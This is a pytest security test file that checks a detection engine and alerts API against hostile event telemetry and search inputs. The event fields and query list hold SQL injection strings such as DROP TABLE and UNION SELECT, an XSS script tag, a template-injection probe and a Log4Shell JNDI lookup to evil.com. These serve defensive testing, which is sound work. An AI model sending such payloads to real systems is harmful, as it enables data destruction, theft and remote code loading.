"""Security tests for Detection Engine and Alerts API.

Verifies that untrusted event telemetry (XSS, SQL injection, format strings)
cannot execute code, compromise SQL queries, or crash detection rules.
"""

import uuid
from datetime import datetime, timezone
from fastapi.testclient import TestClient
from sqlalchemy.orm import Session

from backend.app.detection.core import DetectionContext
from backend.app.detection.rules import DEFAULT_RULES
from backend.app.models.event import SecurityEvent


def test_hostile_sql_injection_in_event_fields_detection_safe(db_session: Session):
    """Hostile SQL injection strings in event attributes do not break rules or SQLAlchemy queries."""
    now = datetime.now(timezone.utc)
    hostile_events = [
        SecurityEvent(
            id=str(uuid.uuid4()),
            timestamp=now,
            event_type="authentication",
            source="windows_event",
            source_ip="192.168.1.1' OR '1'='1",
            destination_ip="10.0.0.1; DROP TABLE alerts; --",
            username="admin' UNION SELECT * FROM users --",
            hostname="host<script>alert(1)</script>",
            action="login'; DELETE FROM security_events; --",
            status="failure",
            severity="high",
            message="Malicious injection attempt {{7*7}} ${jndi:ldap://evil.com/a}",
            raw_event={"payload": "' OR 1=1 --"},
            created_at=now,
        )
    ]

    context = DetectionContext(events=hostile_events)
    # Evaluate all default rules - none should raise an unhandled error or evaluate injection
    for rule in DEFAULT_RULES:
        results = rule.evaluate(context)
        assert isinstance(results, list)


def test_alerts_api_sql_injection_in_search_query(client: TestClient):
    """Hostile search parameter in alerts API is safely parameterized."""
    hostile_queries = [
        "' OR '1'='1",
        "'; DROP TABLE alerts; --",
        "admin'--",
        "<script>alert(1)</script>",
        "%27%20OR%201=1--",
    ]
    for q in hostile_queries:
        resp = client.get(f"/api/v1/alerts?search={q}")
        assert resp.status_code == 200
        assert "alerts" in resp.json()
